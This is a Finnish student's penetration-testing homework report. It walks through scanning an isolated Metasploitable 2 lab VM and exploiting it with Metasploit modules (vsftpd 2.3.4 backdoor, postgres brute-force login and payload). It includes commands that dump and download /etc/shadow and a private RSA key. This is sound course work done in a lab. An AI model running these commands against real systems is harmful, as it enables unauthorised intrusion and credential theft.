# h3 - EternalHomework

- Kurssi: [Tunkeutumistestaus](https://terokarvinen.com/tunkeutumistestaus/) (Karvinen 2026)
- Opettaja: Tero Karvinen
- Raportin kirjoittaja: Jani Karjalainen

## Käyttöympäristö

- Käyttöjärjestelmä: Microsoft Windows 10 Home
- Emolevy: Gigabyte Z170-Gaming K3
- Prosessori: Intel i5-6600K
- Näytönohjain: NVIDIA GeForce RTX 2060
- RAM: 16 GB DDR4
- Virtualisointiohjelmisto: **VMWare Workstation Pro**

 ## x) Lue/katso/kuuntele ja tiivistä

### **Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit** ([Jaswal, N. 2020](https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31))

- Chapter 1 kertoo tunkeutumistestauksen ja metasploitin perusteista.
- Tunkeutumistestauksen menestys riippuu pitkälti oikeiden työkalujen ja metodien käytöstä.
- Valmistautumisvaihe luo sillan testaajan, asiakkaan ja vaatimusten väliin.
** Tunkeutumistestin vaiheet: **

```1. Valmistautumisvaihe --> 2. Tiedustelu --> 3. Uhkamallinnus --> 4. Haavoittuvuusanalyysi --> 5. Hyväksikäyttö --> 6. Hyväksikäytön jälkeen --> 7. Raportointi```

### **Mitä 'nmap -sn' tekee?**

Kävin tämän aiemmassa [raportissani](https://github.com/Karjiss/tunkeutumistestaus/blob/main/h2-DORA-the-Explora.md) läpi.

Lähteenä käytin Nmapin omilla sivuilla olevaa kirjaa, joten uskoisin sen olevan luotettava. ([Lyon, G. 2009a](https://nmap.org/book/man-host-discovery.html)).

```-sn``` on parametri, joka ei skannaa portteja isäntien etsimisen jälkeen. Se myös tulostaa vain isännät, jotka vastasivat viesteihin.

- Isäntien etsiminen toteutuu ```ICMP```-pyynnöllä, verkkoliikenteen ohjauspyynnöllä (```TCP SYN```), kuittausviestillä (```TCP ACK```) ja ```ICMP```-aikaleimalla.

- ```ICMP``` - Internet Control Message Protocol
- ```TCP``` - Transmission Control Protocol 


## b) Tallenna porttiskannauksen tuloksia Metasploitin tietokantoihin

Ennen porttiskannausta loin tietokannan Kalilla seuraavanlailla:

Käynnistin ```postgresql```-serverin komennolla: ```sudo systemctl start postgresql```

Käynnistyksen jälkeen tarkistin vielä tilanteen komennolla: ```systemctl status postgresql```

<img width="718" height="308" alt="image" src="https://github.com/user-attachments/assets/c383d6a3-cdf3-4e6b-8ae4-66c740c42a15" />

Loin ja alustin Metasploitable Frameworkin tietokannan komennolla: ```sudo msfdb init```

<img width="701" height="143" alt="image" src="https://github.com/user-attachments/assets/fff4265e-2ff8-4bd7-95a8-6705e0113f3f" />

- Kuvassa näkyy polku konfigurointitiedostoon: ```/usr/share/metasploit-framework/config/database.yml```

**Tietokannan konfigurointitiedosto:**

<img width="411" height="398" alt="image" src="https://github.com/user-attachments/assets/7711693d-5673-4783-9ced-0aeb3430a9cd" />

Avasin kalilla terminaalin ```root```-oikeuksilla ja käynnistin Metasploit Frameworkin komennolla: ```msfconsole```:

<img width="567" height="154" alt="image" src="https://github.com/user-attachments/assets/70584bc2-5c50-4b36-a765-96accd24d769" />

- I'm in!

Tarkistin vielä tietokannan tilanteen komennolla: ```db_status```

<img width="422" height="59" alt="image" src="https://github.com/user-attachments/assets/7edbc1f8-f14e-427f-827f-76c0c0e3bc8c" />

Taustalla on jo Metasploitable 2 virtuaalikone käynnissä, joten aloitan testit. Varmistin Kalilla, ettei verkkoa ole lähiverkosta ulospäin pingaamalla nimipalveluihin:

<img width="321" height="104" alt="image" src="https://github.com/user-attachments/assets/4e0e7b96-0f1c-48b0-b90b-cf489e54f297" />

Varmistin, ettei Metasploitablen IP-osoite ole muuttunut tekemällä "Host-Discovery" skannauksen ilman porttiskannausta komennolla: ```db_nmap -sn 192.168.32.0/24```

<img width="554" height="210" alt="image" src="https://github.com/user-attachments/assets/33be29af-1df4-41b1-aafd-3f7c172b8a2d" />

- IP-osoite ei ole muuttunut (192.168.32.128).

Kokeilin viime raportissa käyttämiäni parametrejä porttiskannaukseen: ```db_nmap -A -T4 -p-```

<img width="730" height="300" alt="image" src="https://github.com/user-attachments/assets/e95dd95c-23f3-4feb-9ed2-fe3c2d292545" />

- Valtavan paljon tavaraa jälleen.

Olisin voinut ajaa kevyemmän skannin pelkällä versioskannauksella, mutta parametri ```-A``` pitää jo versioskannauksen sisällään.

## c) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä

Aloin tutkimaan tallennettuja tietoja aikaisemman tehtävän jäljiltä:

```msf > hosts```:

<img width="795" height="233" alt="image" src="https://github.com/user-attachments/assets/90ca5f36-0827-499a-8771-82ef7c649297" />

- "Hosts" osiosta löytyy ```-sn``` skannauksella löydetyt koko IP-rangen tietokoneet.

```msf > services```:

<img width="588" height="506" alt="image" src="https://github.com/user-attachments/assets/c9b16bcc-8b61-45b5-a137-9a48b43043a4" />

- Palveluita löytyi todella paljon, mikä on odotettua Metasploitable-konetta skannaillessa.

Tietokantoihin tallennettuja tietoja voi suodattaa erilaisilla komennoilla. Suodatusvaihtoehtoja löytää komennoilla: ```hosts -h``` ja ```services -h```.

Voit esimerkiksi suodattaa listan näyttämään vain portit väliltä 23-660 komennolla: ```services -p 23-660```

<img width="813" height="279" alt="image" src="https://github.com/user-attachments/assets/dbe3e347-0b6e-446e-bc15-13d38bfe7ecb" />

## d) Internet famous. Etsi Metasploitablen mukana tulevista hyökkäyksistä (en: exploits; search) sellainen, joka on ollut julkisuudessa

Varmaan suosituimpia hyökkäyksiä oli EternalBlue, jonka päätin etsiä Metasploitista:

Aloitin hakemalla msfconsolessa komennolla: ```search type:exploit eternalblue``` 

<img width="724" height="497" alt="image" src="https://github.com/user-attachments/assets/9c00b5ed-d8c7-4443-8f88-4c9d7badc666" />

- Hakusanalla löytyi EternalBlue ja EternalRomance. Haussa esille tuli myös muita, kuten: EternalChampion ja EternalSynergy.

Molemmista on kirjoitettu ainakin [Iltasanomissa](https://www.is.fi/digitoday/tietoturva/art-2000005426332.html)(EternalRomance), sekä [BBC:llä](https://www.bbc.com/news/technology-39905509)(EternalBlue).

Exploitista saa enemmän tietoa, kun avaa hyökkäyksen komennolla: ```use exploit/windows/smb/ms17_010_eternalblue``` ja sitten: ```info```

<img width="541" height="306" alt="image" src="https://github.com/user-attachments/assets/b0522542-57b0-423a-8ca3-e1defd2226a2" />

<img width="726" height="273" alt="image" src="https://github.com/user-attachments/assets/5b704c2c-55e8-45b1-99f5-1a06dbfd9f19" />


EternalBlue on NSA:n luoma työkalu, jonka ryhmä "Shadow Brokers" varasti ja laittoi julkiseen jakoon.
Eternalblue hyödyntää haavoittuvuutta ```SMBv1```-verkkoprotokollassa. Se pystyy lähettämään haitallista koodia kohteeseen ([Burdova, C. 2020](https://www.avast.com/c-eternalblue)). Työkalua on käyttänyt ainakin ```WannaCry```, mikä on ollut maailmanlaajuisesti uutisissa.

## e) Vertaile nmap:n omaa tiedostoon tallennusta (-oA foo) ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?

Kokeilin nmapin omaa tallennusta porttiskannaamalla Metasploitable koneen komennolla: ```nmap -oA foo -A -T5 192.168.32.128```

Skannauksen jälkeen etsin nmapin luomat tiedostot komennolla ```ls```

<img width="739" height="149" alt="image" src="https://github.com/user-attachments/assets/50b0963b-af56-4f9b-9689-29fd48ea1152" />

- Parametri ```-oA``` tulostaa skannauksen tulokset kolmeen eri muotoon: normaali luettava, XML ja Grepattava ([Lyon, G. 2009b](https://nmap.org/book/man-output.html)).

Nmapin oma tallennusvaihtoehto on hyvä, kun et halua käyttää tietokantoja. Tiedostoja on myös helppo siirtää. XML tallennus myös mahdollistaa datan viennin johonkin työkaluun tarvittaessa.

Metasploitin ```db_nmap``` tallennus on kätevä, sillä se tallentaa kaikki tiedot skanneista suoraan tietokantaan, mistä voit etsiä ja suodattaa tarvittavaa tietoa yksinkertaisesti. Voit myös käyttää tallennettuja tietoja suoraan hyökkäyksissä saman työkalun alla.

## f) Murtaudu Metasploitablen vsftpd-palveluun

Aloitin etsimällä tietokantaani tallennettuja tietoja ```FTP```-portista.

Käynnistin tietokantani komennolla: ```systemctl start postgresql```(Terminaali on käynnissä root oikeuksilla, muussa tapauksessa lisää sudo komennon alkuun!)

Tämän jälkeen metasploit framework aukeaa komennolla: ```msfconsole```

<img width="579" height="126" alt="image" src="https://github.com/user-attachments/assets/65dcbbc8-7161-4285-8c71-64f7267cab81" />

Tarkastin services tietokannasta FTP-version:

<img width="810" height="177" alt="image" src="https://github.com/user-attachments/assets/d2c266a0-e5d8-4ba2-a455-a41d0f56a8bb" />

- Versio "```vsftpd 2.3.4```" näkyy kuvassa maalattuna.

Seuraavaksi kokeilin hakua: ```search vsftpd 2.3.4 type:exploit```

<img width="1089" height="493" alt="image" src="https://github.com/user-attachments/assets/4a1a5377-3a95-42bb-b22f-5c59ad036fab" />

- Löytyi 1 osuma exploittiin, joka sopisi tähän versioon!
- Payloadin voi ottaa käyttöön komennoilla: ```use 0``` tai ```use exploit/unix/ftp/vsftpd_234_backdoor```.
- ```use 0```-komento toimii siksi, että payoload on moduuli nro 0 haussa.


Syötin komennon: ```use 0```

<img width="660" height="77" alt="image" src="https://github.com/user-attachments/assets/e6c93b1e-36bf-4499-85de-80ec0ada5698" />

Komennolla: ```info``` saan näkyviin payloadin tietoja, asetukset/parametrit, tekijät yms.

<img width="892" height="522" alt="image" src="https://github.com/user-attachments/assets/f55be242-1e23-4ce2-977c-368ae7e58593" />

- RHOSTS, eli kohde IP on määrittämättä.

Määritin RHOSTS kohdeosoitteeksi komennolla: ```set RHOSTS 192.168.32.128```

<img width="1017" height="356" alt="image" src="https://github.com/user-attachments/assets/5866a499-1b38-4fa4-90e0-4295ef720608" />

- RHOSTS muuttui haluttuun IP-osoitteeseen.

Ennen hyökkäystä varmistin, etten ole verkossa:

<img width="302" height="251" alt="image" src="https://github.com/user-attachments/assets/34cf9f16-196f-4c74-bf7a-cfb90ba91b2b" />

- All clear!

Näin aikaisemmin mielenkiintoisen komennon "```help```" osiossa, kokeilin sitä: ```rcheck```

<img width="1157" height="103" alt="image" src="https://github.com/user-attachments/assets/26d64d59-1d7f-4899-9274-3d6f84ee9840" />

- MSF käynnistää siis moduulin uudestaan ja tarkistaa, onko (KOHDE IP) haavoittuva.
- Tulosteen mukaan kyseinen FTP-versio on mahdollisesti haavoittuva.

Ajan hyökkäyksen komennolla: ```exploit```

<img width="673" height="30" alt="image" src="https://github.com/user-attachments/assets/279930f0-355c-450b-820d-4f75a193a2dc" />

- Mitään ei tapahtunut, sillä unohdin määrittää "LHOST", eli hyökkääjän IP.

Määritin LHOST kohdan komennolla: ```set -g LHOST 192.168.32.129```

- Parametri -g tekee muutoksesta "globaalin", eli se on automaattisesti valittuna kaikissa moduuleissa.

<img width="580" height="41" alt="image" src="https://github.com/user-attachments/assets/722fc2dc-b830-4b10-8442-89ad58c29f14" />

Kokeilin ```exploit``` komentoa uudestaan:

<img width="948" height="160" alt="image" src="https://github.com/user-attachments/assets/d1411fe1-0544-4a78-a068-7618be470388" />

- We're in!

Komennoilla: ```sysinfo``` ja ```getuid``` selvitin tietoa kohdekoneesta, sekä kohdekäyttäjän nimen.

<img width="430" height="153" alt="image" src="https://github.com/user-attachments/assets/0cc21409-f631-464e-bb18-8ff75a05c802" />

g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää

Opin tunnilla, että ```/etc/shadow``` pitää sisällään salasanoja. Kokeilin salasanojen varastamista itse:

Komennolla: ```cat /etc/shadow``` voin tulostaa kaikki salasanat.

<img width="565" height="477" alt="image" src="https://github.com/user-attachments/assets/e4864cb9-6322-4c08-a856-5dc642883672" />

- Salasanat ovat hashatty, mutta murrettavissa esim hashcatilla!

Latasin salasanat Kalille komennolla: ```download /etc/shadow```

<img width="952" height="121" alt="image" src="https://github.com/user-attachments/assets/2c1fb1e2-b3b0-4e24-809f-5cce4c4498a3" />

Salasanat murtamalla sinulla on pääsy kaikkiin käyttäjiin koneella, joten liikkuvuus olisi taattu!

Myös komennoilla: ```arp``` ja ```route``` voi löytää tärkeää tietoa, esimerkiksi muista verkkoon liitetyistä laitteista johon voit saada pääsyn

<img width="496" height="282" alt="image" src="https://github.com/user-attachments/assets/4e27a71a-a3f7-49f9-aa90-535bd2a9574c" />

- Tässä labrassa ei löydy mitään, mutta oikeassa kohteessa voisit hyötyä erittäin paljon.

h) Murtaudu Metasploitableen jollain toisella tavalla

Tarkastelin ```services``` tietokantaa jälleen ja mielenkiintoinen havainto oli ```postgresql```. Jos sinne pääsisi, olisi käsissäni Metasploitablen tietokanta!

Hain siis uutta payloadia Metasploitista komennolla: ```search postgresql```

<img width="1161" height="595" alt="image" src="https://github.com/user-attachments/assets/082daa4f-591d-4028-817c-3b676bd49280" />

- Löysin "postgreslogin" nimisen payloadin riviltä 26.
- Rivillä 30 on myös payload, johon haluan palata.

Siirryin payloadiin "26" komennolla: ```use 26``` ja avasin infon komennolla: ```info```

<img width="1130" height="524" alt="image" src="https://github.com/user-attachments/assets/d720e6ac-b9d6-4ced-8bee-567657daff01" />

- Työkalu käyttää oletusyhdistelmiä salasanoista ja käyttäjänimistä.
- Paljon eri vaihtoehtoja käyttää, kuten ```STOP_ON_SUCCESS``` ja ```CreateSession```.

<img width="555" height="96" alt="image" src="https://github.com/user-attachments/assets/12468905-3077-4468-bb8f-b0b7b72b166a" />

- Työkalu siis yrittää päästä sisään bruteforce menetelmällä.

Vaihdoin työkalun "asetuksia" haluamakseni:

**RHOSTS** = ```set RHOSTS 192.168.32.128``` (Kohteen IP)

**STOP_ON_SUCCESS** = ```set STOP_ON_SUCCESS true``` (Pysäyttää payloadin löytäessään oikean salasanan)

**CreateSession** = ```set CreateSession true``` (Luo suoraan session, joka on yhdistetty tietokantaan)

<img width="606" height="120" alt="image" src="https://github.com/user-attachments/assets/cd6c5305-ac6d-4dc0-af99-3c574857a66b" />

Ajoin payloadin komennolla: ```run```

<img width="1063" height="253" alt="image" src="https://github.com/user-attachments/assets/cdc2d154-b4b1-4ec2-afbc-8d8252296000" />

- We're in once again!

Seuraavaksi tarkastin ```sessions``` ja käytin komentoa: ```sessions -h``` saadakseni selville, miten pääsen yhteyteen käsiksi.

<img width="1146" height="526" alt="image" src="https://github.com/user-attachments/assets/842f8d41-9895-4957-b641-d96302d2c7e1" />

- Käynnissä oleva sessio näkyy.
- Ohjeissa kerrotaan että komento: ```sessions -i (ID)``` päästää sessioon kiinni.

Kokeilin ohjeessa olevaa komentoa: ```sessions -i 1```

<img width="540" height="91" alt="image" src="https://github.com/user-attachments/assets/654d6c13-2fc7-4de2-8da4-ebda264c361c" />

- Pääsin yhteyteen kiinni onnistuneesti.

Tarkastelin ohjeita jälleen ```help``` komennolla:

<img width="595" height="502" alt="image" src="https://github.com/user-attachments/assets/aa1bb102-9e67-4eb6-9afe-7e18af6a91ac" />

- Esimerkiksi ```query``` komennolla voit syöttää SQL-kyselyitä.
- Joku pätevä SQL-osaaja varmasti saisi tästä jotain enemmän irti.

Halusin kokeilla vielä aikaisemmin löydettyä payloadia "30". Sen polku oli kuvan mukaan: "exploit/linux/postgres/postgres_payload" 
Kokeilin sitten avata payloadin komennolla: ```use exploit/linux/postgres/postgres_payload```

<img width="609" height="83" alt="image" src="https://github.com/user-attachments/assets/6d0967fc-989c-45dc-9f7e-204d14313b7e" />

- Tämä on siis myös toimiva tapa avata payload.

```info``` komennon ajaessani tarkistin optiot, mitä tarvitsee muuttaa:

<img width="671" height="189" alt="image" src="https://github.com/user-attachments/assets/f5a1df22-7d04-412d-86ae-74f288993be4" />

- Muutetaan siis RHOSTS ja LHOST samalla tavalla, kuin aikaisemmassa testissä :)

**RHOSTS** = 192.168.32.128

**LHOST** = 192.168.32.129

<img width="596" height="71" alt="image" src="https://github.com/user-attachments/assets/15329f01-3110-4619-bc05-c5855a519608" />

**Payload Description**:

<img width="573" height="210" alt="image" src="https://github.com/user-attachments/assets/6efef2ab-a1a3-40e8-b390-6bf8b1947063" />

- Tämä payload descriptionin mukaan lataa kohdekoneelle jaetun ohjelmatiedoston binääri injektiona.

Kokeilen hyökkäystä komennolla: ```exploit```

<img width="692" height="200" alt="image" src="https://github.com/user-attachments/assets/d4ce0b00-8331-47f1-9662-9d0110ead20e" />

- Tällä payloadilla päästiin sisään käyttöjärjestelmään suoraan, kuten aikaisemman tehtävän FTP tapauksessa.

> Sidenote: Tehtävänannossa pyydettiin toista tapaa murtautua sisään, kokeilin kahta. (Innostuin liikaa, sry)

## i) Demonstroi Meterpretrin ominaisuuksia

Meterpreter on Metasploitin edistynyt payload, jolla voit ajaa kohteessa komentoja ([Metasploit. s.a.](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html))

Olen edelleen samassa sessiossa kuin äskeisessä tehtävässä, joten meterpreter on valmiiksi esillä.
Syötettäessä komento: ```help``` saadaan näkyviin esimerkkikomentoja

<img width="575" height="688" alt="image" src="https://github.com/user-attachments/assets/e5a3cd88-4a6a-4580-b7ea-c658be06cb2f" />

- Komentolista on pitkä, mutta kuvassa näkyy esimerkiksi hakemistokomentoja, kuten ```cd```, ```ls``` yms.

Komennolla ```ls``` tulostin työskentelyhakemiston sisällön:

<img width="549" height="319" alt="image" src="https://github.com/user-attachments/assets/41506377-37fb-4da2-8247-e63d9cd7ffbf" />

- Täältä voin esimerkiksi ladata jotain.

Latasin tiedoston "server.key" komennolla: ```download server.key```

<img width="554" height="89" alt="image" src="https://github.com/user-attachments/assets/197d8e93-71c8-41a3-9216-110bc8126048" />

Nyt tiedosto on Kalin /root hakemistossa:

<img width="542" height="112" alt="image" src="https://github.com/user-attachments/assets/f8e57bbf-a20c-42f2-bcc6-d1ee923619bb" />

Komennolla ```cat server.key``` tulostin tiedoston sisällön:

<img width="550" height="283" alt="image" src="https://github.com/user-attachments/assets/d496612d-62b1-4c85-9419-e1e278f288f7" />

- Tämä on kohteen yksityinen RSA-avain, jota voin hyödyntää SSH-yhteyden muodostamisessa.

## j) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt) tai tmux:lla

Ajattelin kokeilla, miltä näyttäisi tallentaa viime tehtävän vaiheet tekstitiedostoon.

Aloitin käynnistämällä shellin tallennuksen komennolla: ```script -fa loki001.txt```

Toistin edellisessä vaiheessa tehdyt vaiheet.

Käytin komentoa ```exit``` ensin ulos meterpreteristä, sitten msfconsolesta ja lopuksi lopettamaan tallennus.

<img width="535" height="102" alt="image" src="https://github.com/user-attachments/assets/39752ac7-9498-48b4-942f-bb9e05d682be" />

- Huomasin errorin: "zsh: corrupt history file /root/.zsh_history".
   - Tämä virhe ilmoittaa siitä, että komentohistoriasi on vahingoittunut tai korruptoitunut. ([GeeksForGeeks. 2025](https://www.geeksforgeeks.org/linux-unix/how-to-fix-a-corrupt-zsh-history-file/))


Kokeilin lähteessä olevia korjauksia.

<img width="392" height="242" alt="image" src="https://github.com/user-attachments/assets/9e901f72-7ed8-4ced-8f45-3a9146c3a69c" />

```
mv .zsh_history .zsh_history_bad = Tekee kopion korruptoituneesta tiedostosta uuden nimen alle.

strings .zsh_history_bad > .zsh_history = Tekee uuden korjatun version tiedostosta.

fc -R .zsh_history = Komento käskee zsh:ta lukemaan uuden korjatun historiatiedoston.

rm ~/.zsh_history_bad = Poistaa korruptoituneen tiedoston.

```
- Virhettä ei enää tullut!

Kokeilin lukea tallennettua tiedostoa komennolla: ```less loki001.txt```

<img width="940" height="577" alt="image" src="https://github.com/user-attachments/assets/4acba6cc-255b-49dc-92a5-e92d262cf9c8" />

- Aikamoista mössöä.

Luin ```less``` komennon man-sivut kalissa, joista löysin parametrin ```-R```, jonka pitäisi korjata ongelma.

Kokeilin komentoa: ```less -R loki001.txt```

<img width="1082" height="733" alt="image" src="https://github.com/user-attachments/assets/c2a5e630-bd97-4931-8858-f9ec473aac76" />

- Vähemmän mössöä mutta ainakin komennoista saa selvää!

- Testatussa lokissa on vielä zsh.history korruptoitunut, tulevien pitäisi olla kunnossa.

##  k) Pivot point. Laita kaikki harjoituksen tiedostot (script -fa, nmap -oA...) samaan kansioon. Hae sopiva pivot point (sovellus, versio, osoite, MAC-numero) 'grep -r' -komennolla. Keksi uskottava esimerkkikysymys, johon haet vastausta

**Tallensin kaikki harjoituksen tiedostot Kalin kotihakemistoon pois rootista seuraavanlailla:**

Loin kalin kotihakemistoon uuden hakemiston nimeltä "SUPERHAKKEROINTI" komennolla: ```mkdir /home/kali/SUPERHAKKEROINTI```

<img width="315" height="43" alt="image" src="https://github.com/user-attachments/assets/2a5e05f3-91fc-401d-9b1d-9a8f476b0b77" />

Käytin tiedostojen siirtämiseen komentoa: ```mk 

<img width="685" height="102" alt="image" src="https://github.com/user-attachments/assets/fb7f92e4-c676-41f1-aa26-f0a98161e401" />

Tarkistin tiedostojen sijainnin Kalin kotihakemistosta komennolla: ``ls``

<img width="425" height="189" alt="image" src="https://github.com/user-attachments/assets/ab098ef3-c3aa-496f-92de-fc1bb75a9aa8" />

- Onnistui!


Seuraava "pivot point" olisi todennäköisesti SSH, sillä onnistuin varastamaan viimeisimmällä postgresql payloadilla kohteen yksityisen RSA-avaimen. Tämä mahdollistaisi minulle helpon pääsyn Metasploitableen jatkosssa. Minulla on myös "shadow"-tiedosto, jossa on tiivistetyt salassanat jotka voisin murtaa esim. Hashcatillä.

Kysymys voisi olla:

1. Mikä on kohdekoneen IP-osoite, MAC-osoite ja SSH-versio?

Voin vastata kysymyksiin etsimällä tiedot näin:

Siirryn harjoitushakemistoon komennolla: ```cd /home/kali/SUPERHAKKEROINTI``

<img width="405" height="129" alt="image" src="https://github.com/user-attachments/assets/aa1c656e-760e-40dd-b0ba-147035fa3300" />

Seuraavaksi haen ``grep -r``-komennolla tietoa, mitä tarvitsen:

```grep -r``` = **Etsii/lukee tietoa koko hakemistosta.**

<img width="667" height="194" alt="image" src="https://github.com/user-attachments/assets/a1a7facf-74c4-4c56-ae20-730ac489009a" />

- Hyödyntäen greppiä ja hakusanoja pystyin etsimään haluamiani rivejä isosta kasasta dataa.

## l) Attaaack! Mitä Mitre Attack taktiikoita ja tekniikoita käytit tässä harjoituksessa?

Käytin harjoituksessa ainakin:

### Discovery

- [T1046](https://attack.mitre.org/techniques/T1046/) - **Network Service Discovery**

  - Tekniikka, jolla skannasin kohteen portteja selvittääkseni kohteen heikkouksia.

### Initial-Access

- [T1190](https://attack.mitre.org/techniques/T1190/)  - **Exploit Public-Facing Application**

  - Tällä tekniikalla hyväksikäytin kohteen heikkoutta sisäänpääsyyn.

### Credential Access 

- [T1003.008](https://attack.mitre.org/techniques/T1003/008/) - **OS Credential Dumping: /etc/passwd and /etc/shadow**

  - Tätä tekniikkaa käytin, kun latasin ```/etc/shadow``` kohdekoneelta hyökkäyskoneelle.

- [T1552](https://attack.mitre.org/techniques/T1552/) - **Unsecured Credentials**

   - Löytäessäni ja ladatessani RSA-avaimen kohdekoneelta, käytin tätä tekniikkaa.

## Lähteet

BBC. 2017. Global cyber-attack: How roots can be traced to the US. Luettavissa: https://www.bbc.com/news/technology-39905509

Burdova, C. Avast. 2020. What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant?. Luettavissa: https://www.avast.com/c-eternalblue

GeeksForGeeks. 2025. How to fix a corrupt zsh history file. Luettavissa: https://www.geeksforgeeks.org/linux-unix/how-to-fix-a-corrupt-zsh-history-file/

Iltasanomat. 2017. Digitoday: Tietoturva. Luettavissa: https://www.is.fi/digitoday/tietoturva/art-2000005426332.html

Jaswal, N. 2020. Mastering Metasploit. O'Reilly. Luettavissa: https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31

Karjalainen, J. 2026. h2-DORA-the-Explora.md. GitHub. Luettavissa: https://github.com/Karjiss/tunkeutumistestaus/blob/main/h2-DORA-the-Explora.md

Karvinen, T. 2026. Tunkeutumistestaus. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/

Lyon, G. 2009. a. Nmap Book: Host Discovery. Luettavissa: https://nmap.org/book/man-host-discovery.html

Lyon, G. 2009. b. Nmap Book: Output Formats. Luettavissa: https://nmap.org/book/man-output.html

Metasploit. s.a. Meterpreter Documentation. Luettavissa: https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html

MITRE ATT&CK. Exploit Public-Facing Application, Technique T1190. Luettavissa: https://attack.mitre.org/techniques/T1190/

MITRE ATT&CK. Network Service Discovery, Technique T1046. Luettavissa: https://attack.mitre.org/techniques/T1046/

MITRE ATT&CK. OS Credential Dumping: /etc/passwd and /etc/shadow, Sub-technique T1003.008. Luettavissa: https://attack.mitre.org/techniques/T1003/008/

MITRE ATT&CK. Unsecured Credentials, Technique T1552. Luettavissa: https://attack.mitre.org/techniques/T1552/
